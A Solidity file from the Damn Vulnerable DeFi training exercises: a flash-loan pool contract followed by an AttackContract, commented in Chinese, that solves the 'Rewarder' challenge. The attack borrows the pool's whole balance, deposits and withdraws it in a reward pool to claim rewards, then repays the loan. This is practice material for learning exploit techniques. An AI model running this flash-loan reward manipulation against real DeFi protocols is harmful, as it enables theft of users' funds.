// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)

 * @dev A simple pool to get flash loans of DVT
 */
contract FlashLoanerPool is ReentrancyGuard {

    using Address for address;

    DamnValuableToken public immutable liquidityToken;

    constructor(address liquidityTokenAddress) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }

    function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));
        require(amount <= balanceBefore, "Not enough token balance");

        require(msg.sender.isContract(), "Borrower must be a deployed contract");
        
        liquidityToken.transfer(msg.sender, amount);

        msg.sender.functionCall(
            abi.encodeWithSignature(
                "receiveFlashLoan(uint256)",
                amount
            )
        );

        require(liquidityToken.balanceOf(address(this)) >= balanceBefore, "Flash loan not paid back");
    }
}
import "./TheRewarderPool.sol";
contract AttackContract{

    DamnValuableToken public token;
    TheRewarderPool public rewardPool;
    FlashLoanerPool public flashPool;
    RewardToken public rewardToken;

    constructor(address _token, address _rewardPool, address _flashPool, address _rewardToken){
        token = DamnValuableToken(_token);
        rewardPool = TheRewarderPool(_rewardPool);
        flashPool = FlashLoanerPool(_flashPool);
        rewardToken = RewardToken(_rewardToken);
    }

    fallback() external {
        uint bal = token.balanceOf(address(this));
        token.approve(address(rewardPool),bal);
        rewardPool.deposit(bal);
        rewardPool.withdraw(bal);
        // 形成闭环
        token.transfer(address(flashPool), bal);
    }

    function attack() public {
        flashPool.flashLoan(token.balanceOf(address(flashPool)));
        // 此时已经在rewardPool中记录了当前合约 所拥有的reward token数量
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }
}